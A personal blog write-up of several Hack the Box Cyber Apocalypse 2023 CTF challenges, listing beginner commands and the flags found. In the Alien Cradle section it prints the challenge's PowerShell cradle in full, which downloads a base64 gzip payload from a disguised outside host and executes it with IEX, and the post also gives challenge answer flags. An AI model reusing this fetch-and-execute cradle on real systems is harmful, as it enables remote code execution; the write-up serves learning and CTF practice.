# Hack the Box Cyber Apocalypse 2023 Complete! (â‰§âˆ‡â‰¦)ï¾‰

Cyber Apocalypse 2023 was a jeopardy style CTF spanning multiple categories such as: forensics, hardware, pwn, misc, web, machine learning, blockchain and cryptography.

This is my first CTF that I have entered though I continue to complete rooms on TryHackMe, using the HTB Academy and working through the PicoCTF Gym.
I've come to understand during this short experience - there's nothing quite like a live CTF. I hope to continue doing CTFs in future, at least, as much as time allows.

(Will be adding more over time).
- **Posts Added:** trapped source, persistence, plaintext tleasure, alien cradle
- **Posts to follow:** getting started, initialise connection, questionnaire, critical flight, debut, timed transmission, and extraterrestrial persistence


## Warmup

-------------------------

This was a fun little flag to be had after joining the Hack the Box discord. It was hiding in the announcements section as:

``` text
HTB{l3t_th3_tr3asur3_hunt1ng_b3g1n!}
```

## Trapped Source (web)
--------------------

This was a pretty straightforward and these were the steps I took for this challenge:

- Viewed the page source (Ctrl + U or Right-Click + View Page Source)
- Scanned the page for any mention of the HTB flag format HTB{...}
- No flag text present, so I checked for any scripts available
- Found a script named "correctPin" and tried the code "8291"
- Got the flag! 


``` text
HTB{V13w_50urc3_c4n_b3_u53ful!!!}
```


## Persistence (misc)
-------------------

First, I'll say, what a fitting name for this challenge ðŸ¤£

At the moment I don't know much about web-based challenges and incorrectly approached this at first. I read the question carefully and soon realised that the page needed to be accessed many, *MANY*  times (around 1000 as per the description).

There may be many ways to approach this, but I used what I knew, which was the handy tool called **cURL**.

At first, I tried to simply use the given url with curl, like so:

``` bash
$ curl ip-address:port/flag
```

And received a garbled string as a result. I knew that it was working, but it wouldn't do to simply repeat this request. So I looked up how to replicate the result continuously.

``` bash
$ while true; do curl ip-address:port/flag; done 
```

Great! This was working as well, but I needed to save the output somewhere:

``` bash
$ while true; do curl --output >(cat >> filename) ip-address:port/flag; done 
```

And after some long time later, a flag appears!
We can view it like so, piping it to grep:

``` bash
$ cat filename | grep "HTB{"
```

Getting the following output:
``` text
HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}
```

## Plaintext Tleasure (forensics)
------------------------------------------------------

This challenge had to be downloaded and contained a zip file, which can easily opened with the following command:

``` bash
$ unzip filename.zip
```

The extract file is named "capture.pcap". which I confirm with the *file* command.
Before searching through the file in its entirety, I decide to try basic commands and see if the flag can be found this way and this is the line which worked:

``` bash
$ strings capture.pcap | grep "HTB{"
```

We get the flag:

``` text
HTB{th3s3_4l13ns_st1ll_us3_HTTP}
```

## Alien Cradle (forensics)
----------------------------------------------------------

We are provided with a zipped folder containing a Powershell script. I confirm the contents:

``` shell
$ file cradle.ps1 

# cradle.ps1: ASCII text, with very long lines (618), with no line terminators
```

Knowing that a lot of text exists within this file, I consider the following command:

``` bash
$ strings cradle.ps1

# if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth'){exit};$w = New-Object net.webclient;$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

The flag is hiding within the post, separated in such a manner that the usual 'trick' of "HTB{" won't suffice here, so it was a good choice to check the contents with *strings*  first.

There probably is a more efficient way to extract the flag from this text, but for now, I simply copied the relevant ouput and cleaned it up as per the flag ruling:

``` text
HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}
```

## Extraterrestrial Persistence (forensics)
